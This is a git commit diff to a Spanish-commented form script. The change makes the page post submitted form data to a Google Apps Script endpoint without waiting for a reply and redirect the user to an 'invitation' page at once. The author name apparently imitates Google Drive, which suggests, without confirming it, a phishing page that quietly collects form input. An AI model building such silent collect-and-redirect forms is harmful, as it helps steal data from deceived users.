ad2ecd408d0e4622c97fbb851c2b3b45c74f325a
drive-gogl-folder1150-0q2adscq80ahd0bgh <jeandazer623@gmail.com>
2025-02-21 13:56:42 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,23 +1,15 @@
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault();
 
+    // Redirigir de inmediato sin esperar la respuesta
+    window.location.href = "invitation.html";
+
     const formData = new FormData(this);
     const url = "https://script.google.com/macros/s/AKfycbxU80QkIHuMrsTIuSLL01BMCpNZ-kmW0M_TlduiLKfHTD8qY2oMVXExV_qlRrbmhgzJ/exec"; // Reemplaza con tu URL de Google Apps Script
 
-    try {
-        const response = await fetch(url, {
-            method: "POST",
-            body: new URLSearchParams(formData),
-            headers: { "Content-Type": "application/x-www-form-urlencoded" }
-        });
-
-        if (response.ok) {
-            alert("Datos enviados correctamente.");
-            window.location.href = "invitation.html";
-        } else {
-            alert("Error al enviar los datos.");
-        }
-    } catch (error) {
-        alert("Ocurrió un error al enviar el formulario.");
-    }
+    fetch(url, {
+        method: "POST",
+        body: new URLSearchParams(formData),
+        headers: { "Content-Type": "application/x-www-form-urlencoded" }
+    }).catch(error => console.error("Error al enviar datos:", error));
 });
